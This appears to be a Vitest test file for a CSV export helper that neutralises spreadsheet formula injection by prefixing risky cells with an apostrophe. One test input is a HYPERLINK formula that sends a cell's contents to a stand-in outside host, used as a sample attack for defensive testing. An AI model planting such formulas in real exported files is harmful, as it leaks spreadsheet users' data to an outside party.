import { describe, expect, it } from "vitest";
import { csvCell, toCsv } from "./csv";

describe("csvCell", () => {
  it("neutralises formulas from untrusted text", () => {
    expect(csvCell('=HYPERLINK("https://x.y?d="&A1,"clic")')).toBe(`"'=HYPERLINK(""https://x.y?d=""&A1,""clic"")"`);
    expect(csvCell("+57 300")).toBe("'+57 300");
    expect(csvCell("-2+3")).toBe("'-2+3");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("keeps numbers and normal text as they are", () => {
    expect(csvCell(-1500)).toBe("-1500");
    expect(csvCell("Promo octubre")).toBe("Promo octubre");
    expect(csvCell(null)).toBe("");
    expect(csvCell("a,b")).toBe('"a,b"');
  });

  it("builds a BOM-prefixed file", () => {
    expect(toCsv([["a", 1], ["=b", null]])).toBe("﻿a,1\r\n'=b,");
  });
});
